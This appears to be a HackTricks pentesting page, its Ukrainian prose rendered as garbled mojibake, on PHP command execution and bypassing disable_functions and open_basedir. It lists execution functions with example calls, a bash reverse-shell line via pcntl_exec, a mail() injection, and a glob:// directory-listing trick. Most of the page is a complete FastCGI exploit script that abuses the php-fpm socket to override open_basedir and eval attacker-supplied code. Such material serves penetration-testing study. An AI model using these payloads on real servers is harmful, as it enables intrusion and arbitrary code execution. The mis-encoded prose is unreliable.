# PHP - –ö–æ—Ä–∏—Å–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Ç–∞ –æ–±—Ö—ñ–¥ disable\_functions/open\_basedir

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

## PHP –ö–æ–º–∞–Ω–¥–Ω–µ —Ç–∞ –∫–æ–¥–æ–≤–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

### PHP –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥

**–ü—Ä–∏–º—ñ—Ç–∫–∞:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php –≤–µ–±-—à–µ–ª–ª –º–æ–∂–µ **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ** –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —Ç–∞ –æ–±—Ö–æ–¥–∏—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—â–æ –¥–µ—è–∫—ñ –∑ –Ω–∏—Ö –≤–∏–º–∫–Ω–µ–Ω—ñ.

**exec** - –ü–æ–≤–µ—Ä—Ç–∞—î –æ—Å—Ç–∞–Ω–Ω—ñ–π —Ä—è–¥–æ–∫ –≤–∏–≤–æ–¥—É –∫–æ–º–∞–Ω–¥
```bash
echo exec("uname  -a");
```
**passthru** - –ü–µ—Ä–µ–¥–∞—î –≤–∏–≤—ñ–¥ –∫–æ–º–∞–Ω–¥ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –±—Ä–∞—É–∑–µ—Ä
```bash
echo passthru("uname -a");
```
**system** - –ü–µ—Ä–µ–¥–∞—î –≤–∏–≤—ñ–¥ –∫–æ–º–∞–Ω–¥ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –±—Ä–∞—É–∑–µ—Ä —ñ –ø–æ–≤–µ—Ä—Ç–∞—î –æ—Å—Ç–∞–Ω–Ω—ñ–π —Ä—è–¥–æ–∫
```bash
echo system("uname -a");
```
**shell\_exec** - –ü–æ–≤–µ—Ä—Ç–∞—î –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –∫–æ–º–∞–Ω–¥
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - –¢–µ –∂ —Å–∞–º–µ, —â–æ —ñ shell\_exec()
```bash
echo `uname -a`
```
**popen** - –í—ñ–¥–∫—Ä–∏–≤–∞—î –∫–∞–Ω–∞–ª —á–∏—Ç–∞–Ω–Ω—è –∞–±–æ –∑–∞–ø–∏—Å—É –¥–æ –ø—Ä–æ—Ü–µ—Å—É –∫–æ–º–∞–Ω–¥–∏
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc\_open** - –°—Ö–æ–∂–µ –Ω–∞ popen(), –∞–ª–µ –∑ –±—ñ–ª—å—à–∏–º —Å—Ç—É–ø–µ–Ω–µ–º –∫–æ–Ω—Ç—Ä–æ–ª—é
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg\_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl\_exec** - –í–∏–∫–æ–Ω—É—î –ø—Ä–æ–≥—Ä–∞–º—É (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É —Å—É—á–∞—Å–Ω–æ–º—É —Ç–∞ –Ω–µ –¥—É–∂–µ —Å—É—á–∞—Å–Ω–æ–º—É PHP –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –º–æ–¥—É–ª—å `pcntl.so`, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb\_send\_mail** - –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –ª–∏—Å—Ç—ñ–≤, –∞–ª–µ —ó—ó —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è —ñ–Ω'—î–∫—Ü—ñ—ó –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ —É –ø–∞—Ä–∞–º–µ—Ç—Ä `$options`. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ **php `mail` —Ñ—É–Ω–∫—Ü—ñ—è** –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–ª–∏–∫–∞—î –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `sendmail` —É —Å–∏—Å—Ç–µ–º—ñ, —ñ —Ü–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–¥–æ–¥–∞–≤–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏**. –û–¥–Ω–∞–∫ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∏—Ö—ñ–¥ –≤–∏–∫–æ–Ω–∞–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏, —Ç–æ–º—É —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è —Å—Ç–≤–æ—Ä–∏—Ç–∏ shell-—Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –∑–∞–ø–∏—Å—É—î –≤–∏—Ö—ñ–¥ —É —Ñ–∞–π–ª, –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é mail —ñ –≤–∏–≤–µ—Å—Ç–∏ –≤–∏—Ö—ñ–¥:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è PHP. –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –Ω–µ –∑–∞–≤–∂–¥–∏ –±—É–¥–µ –ø—Ä–∏—Å—É—Ç–Ω—è, —Ç–æ–º—É –≤–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤–æ–Ω–∞ –¥–æ—Å—Ç—É–ø–Ω–∞, –ø–µ—Ä—à –Ω—ñ–∂ –Ω–∞–º–∞–≥–∞—Ç–∏—Å—è —ó—ó –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏. –ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ [—Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é](disable\_functions-bypass-dl-function.md).

### PHP Code Execution

–û–∫—Ä—ñ–º eval, —î –π —ñ–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP –∫–æ–¥—É: include/require –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —É —Ñ–æ—Ä–º—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π Local File Include —Ç–∞ Remote File Include.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable\_functions & open\_basedir

**–í–∏–º–∫–Ω–µ–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó** - —Ü–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, —è–∫–µ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤ `.ini` —Ñ–∞–π–ª–∞—Ö —É PHP, —â–æ **–∑–∞–±–æ—Ä–æ–Ω—è—î** –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–∫–∞–∑–∞–Ω–∏—Ö **—Ñ—É–Ω–∫—Ü—ñ–π**. **Open basedir** - —Ü–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, —è–∫–µ –≤–∫–∞–∑—É—î PHP, –¥–æ —è–∫–æ—ó –ø–∞–ø–∫–∏ –≤—ñ–Ω –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø.\
–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è PHP –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤ —à–ª—è—Ö—É _/etc/php7/conf.d_ –∞–±–æ –ø–æ–¥—ñ–±–Ω–æ–º—É.

–û–±–∏–¥–≤–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏ –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (493).png>)

## open\_basedir Bypass

`open_basedir` –Ω–∞–ª–∞—à—Ç—É—î –ø–∞–ø–∫–∏, –¥–æ —è–∫–∏—Ö PHP –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –≤–∏ **–Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏/—á–∏—Ç–∞—Ç–∏/–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∂–æ–¥–µ–Ω —Ñ–∞–π–ª –ø–æ–∑–∞** —Ü–∏–º–∏ –ø–∞–ø–∫–∞–º–∏, –∞–ª–µ —Ç–∞–∫–æ–∂ –≤–∏ **–Ω–∞–≤—ñ—Ç—å –Ω–µ –∑–º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏** —ñ–Ω—à—ñ –∫–∞—Ç–∞–ª–æ–≥–∏.\
–û–¥–Ω–∞–∫, —è–∫—â–æ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π PHP –∫–æ–¥, –≤–∏ –º–æ–∂–µ—Ç–µ **—Å–ø—Ä–æ–±—É–≤–∞—Ç–∏** –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç **–∫–æ–¥—ñ–≤**, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–æ–±—ñ–π—Ç–∏** –æ–±–º–µ–∂–µ–Ω–Ω—è.

### Listing dirs with glob:// bypass

–£ —Ü—å–æ–º—É –ø–µ—Ä—à–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø—Ä–æ—Ç–æ–∫–æ–ª `glob://` –∑ –¥–µ—è–∫–∏–º –æ–±—Ö–æ–¥–æ–º —à–ª—è—Ö—É:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Note1**: –£ —à–ª—è—Ö—É –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `/e??/*` –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É `/etc/*` —Ç–∞ –±—É–¥—å-—è–∫–æ—ó —ñ–Ω—à–æ—ó –ø–∞–ø–∫–∏.\
**Note2**: –ó–¥–∞—î—Ç—å—Å—è, —â–æ —á–∞—Å—Ç–∏–Ω–∞ –∫–æ–¥—É –¥—É–±–ª—é—î—Ç—å—Å—è, –∞–ª–µ —Ü–µ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ!\
**Note3**: –¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –∫–æ—Ä–∏—Å–Ω–∏–π –ª–∏—à–µ –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –ø–∞–ø–æ–∫, –∞ –Ω–µ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤.

### –ü–æ–≤–Ω–∏–π –æ–±—Ö—ñ–¥ open\_basedir –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º FastCGI

–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ PHP-FPM —Ç–∞ FastCGI**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ [–ø–µ—Ä—à—É —Å–µ–∫—Ü—ñ—é —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏](disable\_functions-bypass-php-fpm-fastcgi.md).\
–Ø–∫—â–æ **`php-fpm`** –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –Ω–∏–º, —â–æ–± –ø–æ–≤–Ω—ñ—Å—Ç—é –æ–±—ñ–π—Ç–∏ **open\_basedir**:

![](<../../../../.gitbook/assets/image (545).png>)

![](<../../../../.gitbook/assets/image (577).png>)

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø–µ—Ä—à–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –∑–Ω–∞–π—Ç–∏, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è **unix socket php-fpm**. –í—ñ–Ω –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –ø—ñ–¥ `/var/run`, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∫–æ–¥ –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –∫–∞—Ç–∞–ª–æ–≥—É —Ç–∞ –∑–Ω–∞–π—Ç–∏ –π–æ–≥–æ**.\
–ö–æ–¥ –∑ [—Ç—É—Ç](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
–¶—ñ —Å–∫—Ä–∏–ø—Ç–∏ –±—É–¥—É—Ç—å –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ **unix socket php-fpm** (–∑–∞–∑–≤–∏—á–∞–π —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–º —É /var/run, —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è fpm), —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥. –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `open_basedir` –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ –∞—Ç—Ä–∏–±—É—Ç–æ–º **PHP\_VALUE**, —è–∫–∏–π –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ `eval` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP –∫–æ–¥—É, —è–∫–∏–π –≤–∏ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ **cmd**.\
